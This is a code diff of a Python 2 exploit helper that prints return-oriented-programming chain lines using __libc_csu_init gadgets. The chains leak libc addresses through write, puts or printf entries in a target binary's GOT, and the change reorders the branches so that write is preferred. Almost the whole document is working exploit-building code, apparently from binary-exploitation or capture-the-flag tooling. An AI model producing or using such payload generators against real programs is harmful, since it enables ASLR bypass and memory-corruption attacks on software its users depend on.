@@ -35,7 +35,30 @@ else:
         print "error: __libc_csu_init is not in the symbols list, specify address_of_libc_csu_init in program args"
         exit(1)
 
-if "puts" in binary.got:
+if "write" in binary.got:
+    print "[*] using `write` to print the leak"
+    print
+    # write(1, &write, sizeof(void*))
+    print "rop = ''"
+    print "rop += p64(0x%x) # gadget 1" % gadget1
+    print "rop += p64(0) # rbx"
+    print "rop += p64(0) # rbp"
+    print "rop += p64(0x%x) # r12 [write@got]" % binary.got["write"]
+    print "rop += p64(8) # r13 [sizeof void*]"
+    if to_leak == None:
+        print "rop += p64(0x%x) # r14 [write@got]" % binary.got["write"]
+    else:
+        print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
+    print "rop += p64(1) # r15 [stdout]"
+    print "rop += p64(0x%x) # gadget 2" % gadget2
+    print "rop += p64(0xdeadbeef) # junk"
+    print "rop += p64(0) # rbx"
+    print "rop += p64(0) # rbp"
+    print "rop += p64(0) # r12"
+    print "rop += p64(0) # r13"
+    print "rop += p64(0) # r14"
+    print "rop += p64(0) # r15"
+elif "puts" in binary.got:
     print "[*] using `puts` to print the leak"
     print
     # puts(&puts)
@@ -73,29 +96,6 @@ elif "printf" in binary.got:
         print "rop += p64(0x%x) # r15 [printf@got]" % binary.got["printf"]
     else:
         print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
-    print "rop += p64(0x%x) # gadget 2" % gadget2
-    print "rop += p64(0xdeadbeef) # junk"
-    print "rop += p64(0) # rbx"
-    print "rop += p64(0) # rbp"
-    print "rop += p64(0) # r12"
-    print "rop += p64(0) # r13"
-    print "rop += p64(0) # r14"
-    print "rop += p64(0) # r15"
-elif "write" in binary.got:
-    print "[*] using `write` to print the leak"
-    print
-    # write(1, &write, sizeof(void*))
-    print "rop = ''"
-    print "rop += p64(0x%x) # gadget 1" % gadget1
-    print "rop += p64(0) # rbx"
-    print "rop += p64(0) # rbp"
-    print "rop += p64(0x%x) # r12 [write@got]" % binary.got["write"]
-    print "rop += p64(8) # r13 [sizeof void*]"
-    if to_leak == None:
-        print "rop += p64(0x%x) # r14 [write@got]" % binary.got["write"]
-    else:
-        print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
-    print "rop += p64(1) # r15 [stdout]"
     print "rop += p64(0x%x) # gadget 2" % gadget2
     print "rop += p64(0xdeadbeef) # junk"
     print "rop += p64(0) # rbx"
